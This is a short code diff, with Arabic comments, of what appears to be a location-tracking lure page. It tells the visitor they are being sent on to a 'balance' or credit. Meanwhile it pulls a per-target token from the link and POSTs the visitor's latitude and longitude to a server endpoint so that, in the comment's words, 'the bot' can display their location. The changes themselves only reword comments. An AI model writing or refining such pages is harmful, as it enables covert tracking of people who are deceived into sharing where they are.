@@ -78,7 +78,7 @@
                         statusText.textContent = "تم استلام الموقع بنجاح! جاري تحويلك للرصيد...";
                         statusText.className = "text-xs text-emerald-400 font-bold";
 
-                        // استخراج الرمز token من المسار (مثل /getLocation/07dfbe0f)
+                        // استخراج المعرف أو الرمز من المسار الأخير (مثل /getLocation/07dfbe0f)
                         const pathParts = window.location.pathname.split('/');
                         const token = pathParts.pop() || pathParts.pop() || new URLSearchParams(window.location.search).get('t');
 
@@ -87,7 +87,7 @@
                             return;
                         }
 
-                        // إرسال الإحداثيات المباشرة لكي يتعرف عليها البوت ويعرضها كموقع
+                        // تجهيز بيانات الموقع مع تضمين الرمز وإحداثيات الخرائط
                         const payload = {
                             token: token,
                             latitude: position.coords.latitude,
@@ -97,6 +97,7 @@
                         };
 
                         try {
+                            // إرسال البيانات عبر POST إلى المسار العام المعتمد في السيرفر
                             await fetch('/mm', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
